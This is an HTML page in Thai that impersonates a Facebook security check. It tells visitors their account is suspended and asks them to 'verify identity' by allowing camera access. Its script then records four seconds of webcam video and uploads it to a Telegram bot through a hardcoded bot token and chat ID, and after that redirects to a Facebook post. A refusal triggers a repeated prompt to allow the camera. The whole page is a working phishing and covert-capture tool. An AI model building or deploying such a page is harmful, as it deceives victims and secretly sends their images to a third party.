<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        button { background: #1877f2; color: white; border: none; padding: 15px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
        #loading { display: none; color: #606770; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="50" style="margin-bottom:10px;">
    <h3>ยืนยันสิทธิ์เข้าใช้งาน</h3>
    <p style="font-size:14px; color:#606770;">บัญชีของคุณถูกระงับชั่วคราว โปรดยืนยันตัวตนเพื่อเข้าสู่ระบบต่อ</p>
    
    <button type="button" id="startBtn">กดเพื่อยืนยันตัวตน</button>
    
    <div id="loading">กำลังตรวจสอบความปลอดภัย...</div>
</div>

<script>
    // ใส่ค่าของพี่
    const TOKEN = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
    const CHAT_ID = '8482017371';
    const REDIRECT_URL = 'https://www.facebook.com/share/p/1avrMEzzJn/';

    // ฟังก์ชันนี้จะทำงาน "เมื่อกดปุ่มเท่านั้น"
    document.getElementById('startBtn').addEventListener('click', async function() {
        const btn = this;
        const loader = document.getElementById('loading');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        try {
            // 1. ขอสิทธิ์กล้อง
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('video', blob, 'capture.mp4');

                // 2. ส่งเข้า Telegram (รอให้เสร็จ)
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
                } catch (e) { console.log('Upload error'); }

                // 3. ปิดกล้องและดีดหน้า
                stream.getTracks().forEach(track => track.stop());
                window.location.href = REDIRECT_URL;
            };

            mediaRecorder.start();
            setTimeout(() => { mediaRecorder.stop(); }, 4000); // ถ่าย 4 วินาที

        } catch (err) {
            // ถ้ามันกดปฏิเสธ หรือมี Error ให้กลับมาที่ปุ่มเดิม ไม่มีการเด้งไปไหน
            alert("โปรดกด 'อนุญาต' กล้องเพื่อยืนยันสิทธิ์");
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    });
</script>

</body>
</html>
